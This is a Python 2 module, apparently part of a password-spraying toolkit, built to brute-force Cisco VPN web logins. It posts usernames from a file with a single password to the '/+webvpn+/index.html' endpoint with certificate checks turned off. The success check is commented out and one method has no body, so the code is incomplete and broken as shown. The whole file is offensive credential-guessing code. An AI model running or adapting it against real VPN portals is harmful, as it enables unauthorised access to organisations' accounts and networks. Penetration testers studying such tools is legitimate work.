#! /usr/bin/python
# This module is for Cisco VPN client Brute Forcing
# Created by Kirk Hayes - l0gan (@kirkphayes)
from requests import session
import requests
import re
from argparse import ArgumentParser

class CiscoVPN():
    def somethingCool(self, config, payload):
        #Do something cool here
    def connectTest(self, config, payload):
        #Create a session and check if account is valid
        with session() as c:
            #resp1 = c.get(config["HOST"] + '/employee/login.jsp', verify=False)
            #cookie1 = resp1.cookies['JSESSIONID']
            #cookies = dict(JSESSIONID=cookie1)
            #c.headers.update({'Host': config["HOST"], 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0', 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 'Referer:' + config["HOST"] + '/employee/login.jsp', 'Accept-Language': 'en-US,en;q=0.5'})
            #c.cookies.clear()
            cpost = c.post(config["HOST"] + '/+webvpn+/index.html', data=payload, allow_redirects=True, verify=False)
            print cpost.text
            print cpost.status
            #m = re.search('You are unauthorized to access this page.', cpost.text)
            #if m:
        #        print("[+]  User Credentials Successful: " + config["USERNAME"] + ":" + config["PASSWORD"])
    #            self.somethingCool(config, payload)
    #        else:
    #            print("[-]  Login Failed for: " + config["USERNAME"] + ":" + config["PASSWORD"])
    def payload(self, config):
        # Create authentication payload
        if config["UserFile"]:
            lines = [line.rstrip('\n') for line in open(config["UserFile"])]
            for line in lines:
                config["USERNAME"] = line.strip('\n')
                payload = {
                    'username': config["USERNAME"],
                    'password': config["PASSWORD"]
                    }
                self.connectTest(config, payload)
        else:
            payload = {
                'username': config["USERNAME"],
                'password': config["PASSWORD"]
            }
            self.connectTest(config, payload)
